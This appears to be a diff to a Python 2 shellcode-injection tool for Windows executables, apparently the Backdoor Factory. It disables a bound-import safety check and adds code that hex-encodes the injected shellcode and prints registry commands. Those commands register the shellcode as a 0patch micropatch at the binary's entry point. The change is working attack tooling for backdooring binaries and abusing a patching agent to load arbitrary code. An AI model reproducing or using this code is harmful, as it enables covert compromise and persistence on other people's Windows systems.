@@ -45,6 +45,8 @@ import random
 import string
 import re
 import tempfile
+import binascii
+import hashlib
 from random import choice
 from winapi import winapi
 from intel.intelCore import intelCore
@@ -1448,9 +1450,9 @@ class pebin():
             else:
                 self.flItms['supported'] = False
 
-            if self.flItms['BoundImportSize'] != 0:
-                print "[!] No support for Bound Imports at this time"
-                return False
+            #if self.flItms['BoundImportSize'] != 0:
+            #    print "[!] No support for Bound Imports at this time"
+            #    return False
 
             if self.RUNAS_ADMIN is True and self.SUPPORT_CHECK is True:
                 self.parse_rsrc()
@@ -1902,6 +1904,27 @@ class pebin():
                     self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16))
                     self.binary.write(self.flItms['completeShellcode'])
 
+        #0patch write out here
+        temp_meh =''
+        for meh in self.flItms['completeShellcode']:
+            if len(hex(meh)) < 4:
+                temp_meh +=  "0" + hex(meh).replace("0x", '')
+            else:
+                temp_meh += hex(meh).replace("0x", '')
+
+        Code = temp_meh
+        Offset = hex(self.flItms['AddressOfEntryPoint'])
+        original_bytes = binascii.hexlify(self.flItms['ImpList'][0][4])
+        sha_sum_file = hashlib.sha1(open(self.FILE, 'rb').read()).hexdigest()
+        regedit = """
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\\0patch\Patches\{0}\{4}\\600\\0
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\\0patch\Patches\{0}\{4}\\600 /v Status /t REG_DWORD /d 1
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\\0patch\Patches\{0}\{4}\\600 /v VulnId /t REG_DWORD /d 4000
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\\0patch\Patches\{0}\{4}\\600\\0\ /v Code /t REG_BINARY /d {1}
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\\0patch\Patches\{0}\{4}\\600\\0\ /v Offset /t REG_QWORD /d {2}
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\\0patch\Patches\{0}\{4}\\600\\0\ /v OriginalBytes /t REG_BINARY /d {3}
+        """.format(self.FILE, Code, Offset, original_bytes, sha_sum_file)
+        print regedit
         self.binary.close()
 
         if self.CODE_SIGN is True:
